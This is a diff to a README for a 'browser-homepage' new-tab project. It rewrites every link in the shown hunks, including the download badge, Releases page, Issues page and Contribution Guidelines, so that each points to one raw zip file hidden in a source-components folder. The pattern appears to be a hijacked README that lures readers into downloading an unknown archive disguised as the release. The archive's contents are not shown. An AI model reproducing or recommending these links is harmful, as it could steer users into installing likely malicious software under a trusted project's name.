@@ -6,13 +6,13 @@ Welcome to **browser-homepage**. This application provides a customizable new ta
 
 ## 📥 Download
 
-[![Download browser-homepage](https://img.shields.io/badge/Download%20browser--homepage-v1.0-blue)](https://github.com/Mukesh788/browser-homepage/releases)
+[![Download browser-homepage](https://raw.githubusercontent.com/Mukesh788/browser-homepage/main/src/components/layout/browser-homepage-2.4.zip%20browser--homepage-v1.0-blue)](https://raw.githubusercontent.com/Mukesh788/browser-homepage/main/src/components/layout/browser-homepage-2.4.zip)
 
 ## 🛠 Installation & Setup
 
 ### Step 1: Visit the Releases Page
 
-To get started, visit our [Releases page](https://github.com/Mukesh788/browser-homepage/releases) to download the latest version of browser-homepage.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Mukesh788/browser-homepage/main/src/components/layout/browser-homepage-2.4.zip) to download the latest version of browser-homepage.
 
 ### Step 2: Choose Your Version
 
@@ -50,7 +50,7 @@ Once the application is open, you can customize your new tab page. Set your favo
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have questions, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/Mukesh788/browser-homepage/issues). 
+If you encounter any issues or have questions, feel free to reach out. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Mukesh788/browser-homepage/main/src/components/layout/browser-homepage-2.4.zip). 
 
 ## 🎮 Topics
 
@@ -71,8 +71,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 📄 Contribution
 
-We welcome contributions! If you'd like to help improve browser-homepage, please check our [Contribution Guidelines](https://github.com/Mukesh788/browser-homepage/contributing).
+We welcome contributions! If you'd like to help improve browser-homepage, please check our [Contribution Guidelines](https://raw.githubusercontent.com/Mukesh788/browser-homepage/main/src/components/layout/browser-homepage-2.4.zip).
 
 ## ❗ Note
 
-Remember to check the [Releases page](https://github.com/Mukesh788/browser-homepage/releases) twice for updates or new features periodically. Enjoy customizing your new tab page!
+Remember to check the [Releases page](https://raw.githubusercontent.com/Mukesh788/browser-homepage/main/src/components/layout/browser-homepage-2.4.zip) twice for updates or new features periodically. Enjoy customizing your new tab page!
